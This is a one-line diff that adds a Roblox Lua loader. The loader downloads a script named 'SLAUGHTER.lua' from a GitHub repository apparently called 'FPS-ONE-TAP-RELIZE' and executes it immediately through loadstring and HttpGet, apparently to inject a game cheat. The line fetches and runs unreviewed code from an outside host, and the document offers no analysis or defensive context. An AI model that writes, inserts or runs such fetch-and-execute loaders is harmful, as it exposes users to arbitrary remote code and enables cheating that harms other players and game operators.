@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kustom346-ops/FPS-ONE-TAP-RELIZE/main/SLAUGHTER.lua?t=" .. tick()))()
